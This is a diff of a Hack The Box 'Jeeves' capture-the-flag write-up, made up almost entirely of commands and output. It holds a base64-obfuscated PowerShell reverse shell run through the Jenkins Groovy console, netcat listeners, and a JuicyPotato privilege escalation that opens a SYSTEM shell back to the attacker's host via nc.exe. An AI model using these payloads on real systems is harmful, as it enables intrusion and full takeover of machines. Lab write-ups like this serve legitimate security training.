@@ -65,7 +65,10 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 51.50 seconds
 ```
+## P1
 ![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-30.png){: w="700" }
+
+## P2
 
 ![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-31.png){: w="700" }
 ```
@@ -77,9 +80,213 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.
 ```
 powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
-
 ```
 def cmd = "powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA".execute();
 ```
 
 ![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-31_1.png){: w="700" }
+
+```
+└─$ nc -nlvp 9001
+listening on [any] 9001 ...
+connect to [10.10.15.107] from (UNKNOWN) [10.129.62.218] 49681
+
+PS C:\Users\Administrator\.jenkins>
+```
+
+```
+PS C:\users\kohsuke\Desktop> type user.txt
+```
+## P3 & P4
+```
+PS C:\Users\Administrator\.jenkins> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+```
+└─$ sudo impacket-smbserver share -smb2support /mnt/hgfs/D/bb/pentest-tools/windows-tools/windows-privesc
+```
+```
+PS C:\Users\Administrator\.jenkins> Copy-Item \\10.10.15.107\share\JuicyPotato.exe
+PS C:\Users\Administrator\.jenkins> Copy-Item \\10.10.15.107\share\nc.exe
+```
+```
+PS C:\Users\Administrator\.jenkins> reg query HKCR\CLSID /s /f "LocalService"
+
+HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
+    LocalService    REG_SZ    winmgmt
+
+HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+    LocalService    REG_SZ    winmgmt
+
+End of search: 2 match(es) found.
+```
+```
+nc -lvnp 3001
+```
+```
+PS C:\Users\Administrator\.jenkins> .\JuicyPotato.exe -t * -p cmd.exe -l 53375 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -a "/c c:\users\administrator\.jenkins\nc.exe 10.10.15.107 3001 -e cmd.exe"
+Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 53375
+......
+[+] authresult 0
+{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+```
+```
+└─$ nc -lvnp 3001
+listening on [any] 3001 ...
+connect to [10.10.15.107] from (UNKNOWN) [10.129.62.218] 50247
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+```
+C:\Windows\system32>type c:\users\Administrator\Desktop\hm.txt
+type c:\users\Administrator\Desktop\hm.txt
+The flag is elsewhere.  Look deeper.
+```
+
+```
+C:\Windows\system32>dir /s /b C:\*flag* 2>nul               
+dir /s /b C:\*flag* 2>nul
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\shared\diorama\diorama31\episode91\models\interactable\ep91_flags.ffm
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\shared\diorama\diorama33\episode97\models\interactable\ep97_royal_flag.ffm
+C:\Windows\InfusedApps\Packages\Microsoft.Office.Sway_17.6216.20251.0_x64__8wekyb3d8bbwe\Assets\WebPlayer\newfeatureflag.png
+C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Assets\flags.htm
+C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\en-US\assets\flags.htm
+C:\Windows\WinSxS\amd64_microsoft-windows-m..osoftedge.resources_31bf3856ad364e35_10.0.10586.0_en-us_79b8789c46d2112b\flags.htm
+C:\Windows\WinSxS\amd64_microsoft-windows-m..osoftedge.resources_31bf3856ad364e35_10.0.10586.218_en-us_5a620bbcfb647a86\flags.htm
+C:\Windows\WinSxS\amd64_microsoft-windows-microsoftedge_31bf3856ad364e35_10.0.10586.0_none_9dbd56cc9a76ad54\flags.htm
+C:\Windows\WinSxS\amd64_microsoft-windows-microsoftedge_31bf3856ad364e35_10.0.10586.1176_none_3e3d2fa1f737d9cf\flags.htm
+```
+```
+C:\Windows\system32>dir /s /b C:\*root* 2>nul
+dir /s /b C:\*root* 2>nul
+C:\Documents and Settings\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs
+C:\Documents and Settings\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca
+C:\Documents and Settings\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca.txt
+C:\Documents and Settings\Administrator\AppData\Roaming\Microsoft\Windows\Recent\wwwroot.lnk
+C:\Documents and Settings\Administrator\Application Data\Microsoft\Windows\Recent\wwwroot.lnk
+C:\Documents and Settings\Administrator\Recent\wwwroot.lnk
+C:\inetpub\wwwroot
+C:\inetpub\temp\IIS Temporary Compressed Files\DefaultAppPool\$^_gzip_C^\INETPUB\WWWROOT
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_editor.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_emscripten.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_emscripten_dev.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_low_end.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_dev.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low_dev.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low_ota.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low_ota_dev.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_ota.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_ota_dev.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\kingdom-views\scenes\menu_root.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\kingdom-views\scenes\root.xml
+C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\kingdom-views\scenes\view_root_layout.xml
+C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_17.7608.23501.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Program Files\WindowsApps\Microsoft.Office.OneNote_17.8625.21151.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_17.8008.42001.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs
+C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca
+C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca.txt
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\wwwroot.lnk
+C:\Users\Administrator\Application Data\Microsoft\Windows\Recent\wwwroot.lnk
+C:\Users\Administrator\Recent\wwwroot.lnk
+C:\Windows\assembly\NativeImages_v4.0.30319_32\Microsoft.W0bb5dac4#\2cdb0a146f57526d407eeb611d5110d1\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll
+C:\Windows\assembly\NativeImages_v4.0.30319_32\Microsoft.W0bb5dac4#\2cdb0a146f57526d407eeb611d5110d1\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll.aux
+C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.W0bb5dac4#\aef6f11bf8a171cf4e61775ec78afc15\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll
+C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.W0bb5dac4#\aef6f11bf8a171cf4e61775ec78afc15\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll.aux
+C:\Windows\INF\vdrvroot.inf
+C:\Windows\INF\vdrvroot.PNF
+C:\Windows\InfusedApps\Packages\Microsoft.MicrosoftOfficeHub_17.6306.23501.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Windows\InfusedApps\Packages\Microsoft.Office.OneNote_17.6131.10051.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Windows\InfusedApps\Packages\Microsoft.Office.Sway_17.6216.20251.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Windows\InfusedApps\Packages\microsoft.windowscommunicationsapps_17.6308.42271.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
+C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause
+C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.Resources
+C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause\v4.0_10.0.0.0__31bf3856ad364e35\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.dll
+C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.Resources\v4.0_1.0.0.0_en_31bf3856ad364e35\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.resources.dll
+C:\Windows\System32\catroot
+C:\Windows\System32\DriverStore\en-US\vdrvroot.inf_loc
+C:\Windows\System32\DriverStore\FileRepository\vdrvroot.inf_amd64_d2ddbd0f3a5454ae
+C:\Windows\System32\DriverStore\FileRepository\vdrvroot.inf_amd64_d2ddbd0f3a5454ae\vdrvroot.inf
+C:\Windows\System32\DriverStore\FileRepository\vdrvroot.inf_amd64_d2ddbd0f3a5454ae\vdrvroot.sys
+C:\Windows\System32\DriverStore\FileRepository\wiahp008.inf_amd64_b8d3b6bdcf46f3d9\amd64\HPWia2DrvRootWn8.dll
+C:\Windows\SysWOW64\catroot
+C:\Windows\WinSxS\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f
+C:\Windows\WinSxS\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28
+C:\Windows\WinSxS\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.0_none_6796a3c058d600b3
+C:\Windows\WinSxS\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.1106_none_080f7a8fb59d7bcd
+C:\Windows\WinSxS\amd64_microsoft-windows-m..levelmanifests-root_31bf3856ad364e35_10.0.10586.0_none_eb31f683ea41dee5
+C:\Windows\WinSxS\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812
+C:\Windows\WinSxS\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d
+C:\Windows\WinSxS\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a
+C:\Windows\WinSxS\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f\vdrvroot.inf
+C:\Windows\WinSxS\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f\vdrvroot.sys
+C:\Windows\WinSxS\amd64_microsoft-hyper-v-v..otporterr.resources_31bf3856ad364e35_10.0.10586.0_en-us_5e4f9985853701c5\removerootporterr.mfl
+C:\Windows\WinSxS\amd64_microsoft-hyper-v-v..otporterr.resources_31bf3856ad364e35_10.0.10586.0_en-us_5e4f9985853701c5\rootporterr.mfl
+C:\Windows\WinSxS\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28\removerootporterr.mof
+C:\Windows\WinSxS\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28\rootporterr.mof
+C:\Windows\WinSxS\amd64_microsoft-windows-unimodem-core_31bf3856ad364e35_10.0.10586.0_none_211dcb247ee5229b\rootmdm.sys
+C:\Windows\WinSxS\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812\vdrvroot.inf_loc
+C:\Windows\WinSxS\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812\vdrvroot.sys.mui
+C:\Windows\WinSxS\amd64_wiahp008.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_1d559b940c40a623\HPWia2DrvRootWn8.dll.mui
+C:\Windows\WinSxS\amd64_wiahp008.inf_31bf3856ad364e35_10.0.10586.0_none_20165d751d27bff5\amd64\HPWia2DrvRootWn8.dll
+C:\Windows\WinSxS\FileMaps\$$_system32_catroot2_dcafaffaaa56ddae.cdf-ms
+C:\Windows\WinSxS\FileMaps\$$_system32_catroot_dcafaffa24ca18cc.cdf-ms
+C:\Windows\WinSxS\FileMaps\$$_system32_catroot_f750e6c3-38ee-11d1-85e5-00c04fc295ee__0f6ee2e4c9b287a4.cdf-ms
+C:\Windows\WinSxS\FileMaps\$$_syswow64_catroot_19d09cfeaa84d098.cdf-ms
+C:\Windows\WinSxS\FileMaps\$$_syswow64_catroot_f750e6c3-38ee-11d1-85e5-00c04fc295ee__ada83e5211e1e29e.cdf-ms
+C:\Windows\WinSxS\FileMaps\inetpub_wwwroot_6ed3ca13b4c8f4c8.cdf-ms
+C:\Windows\WinSxS\Manifests\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.0_none_6796a3c058d600b3.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.1106_none_080f7a8fb59d7bcd.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-capi2-test-root_31bf3856ad364e35_10.0.10586.0_none_f7f63ae5cdb9fbe6.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-clientrootsecurity_31bf3856ad364e35_10.0.10586.0_none_7ec0da466b62c814.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-m..levelmanifests-root_31bf3856ad364e35_10.0.10586.0_none_eb31f683ea41dee5.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-rootenum-temp_31bf3856ad364e35_10.0.10586.0_none_e47cc5762f118f15.manifest
+C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-rootsecurity_31bf3856ad364e35_10.0.10586.0_none_fe878e5427454e13.manifest
+C:\Windows\WinSxS\Manifests\amd64_vdrvroot.inf-languagepack_31bf3856ad364e35_10.0.10586.0_en-us_b88d3e4339719e6b.manifest
+C:\Windows\WinSxS\Manifests\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812.manifest
+C:\Windows\WinSxS\Manifests\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d.manifest
+C:\Windows\WinSxS\Manifests\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a.manifest
+C:\Windows\WinSxS\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.resources.dll
+C:\Windows\WinSxS\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.dll
+```
+```
+C:\Users\Administrator\Desktop>dir /R
+dir /R
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,635,968,512 bytes free
+```
+
+```
+C:\Users\Administrator\Desktop>more < hm.txt:root.txt
+```
